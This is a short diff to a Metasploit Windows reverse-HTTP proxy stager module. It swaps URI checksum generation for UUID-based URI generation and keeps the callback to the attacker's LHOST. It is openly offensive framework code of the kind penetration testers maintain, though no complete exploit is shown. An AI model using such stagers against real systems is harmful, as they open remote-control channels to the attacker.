@@ -5,7 +5,7 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_http'
-
+require 'msf/core/payload/uuid_options'
 
 module Metasploit3
 
@@ -13,6 +13,7 @@ module Metasploit3
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
+  include Msf::Payload::UUIDOptions
 
   def self.handler_type_alias
     "reverse_http_proxy_pstore"
@@ -99,7 +100,7 @@ module Metasploit3
   def generate
     p = super
     i = p.index("/12345\x00")
-    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
+    u = generate_uri_uuid_mode(:init_native, 5) + "\x00"
     p[i, u.length] = u
     p + datastore['LHOST'].to_s + "\x00"
   end
